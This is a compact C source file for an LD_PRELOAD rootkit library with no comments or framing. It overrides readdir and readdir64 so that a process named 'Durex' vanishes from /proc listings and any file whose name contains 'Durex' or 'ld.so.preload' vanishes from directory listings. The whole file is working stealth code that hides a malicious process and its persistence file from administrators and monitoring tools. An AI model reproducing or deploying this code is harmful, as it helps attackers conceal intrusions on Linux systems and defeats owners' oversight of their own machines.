#define _GNU_SOURCE
#include<stdio.h>
#include<dlfcn.h>
#include<dirent.h>
#include<unistd.h>
#include<string.h>
static const char*filter[]={"Durex","ld.so.preload",0};
static int get_dir_name(DIR*dirp,char*buf,size_t size){int fd;char tmp[64];ssize_t ret;fd=dirfd(dirp);if(fd<0)return 0;snprintf(tmp,sizeof(tmp),"/proc/self/fd/%d",fd);ret=readlink(tmp,buf,size);if(ret<0)return 0;buf[ret]=0;return 1;}static int get_process_name(char*pid,char*buf){char tmp[256];FILE*f;int unused;if(strspn(pid,"0123456789")!=strlen(pid))return 0;snprintf(tmp,sizeof(tmp),"/proc/%s/stat",pid);f=fopen(tmp,"r");if(f==NULL)return 0;if(fgets(tmp,sizeof(tmp),f)==0){fclose(f);return 0;}fclose(f);sscanf(tmp,"%d (%[^)]s",&unused,buf);return 1;}
#define DECLARE_READDIR(dirent,readdir) static struct dirent*(*original_##readdir)(DIR*)=0;struct dirent*readdir(DIR*dirp){if(original_##readdir==0){original_##readdir=dlsym(RTLD_NEXT,"readdir");if(original_##readdir==0){return 0;}}struct dirent*dir;while(1){dir=original_##readdir(dirp);if(dir){char dir_name[256];char process_name[256];if(get_dir_name(dirp,dir_name,sizeof(dir_name))&&!strcmp(dir_name,"/proc")&&get_process_name(dir->d_name,process_name)){int i=0;while(filter[i]){if(!strcmp(process_name,filter[i]))break;i++;}if(filter[i])continue;}int i=0;while(filter[i]){if(strstr(dir->d_name,filter[i]))break;i++;}if(filter[i])continue;}break;}return dir;}
DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
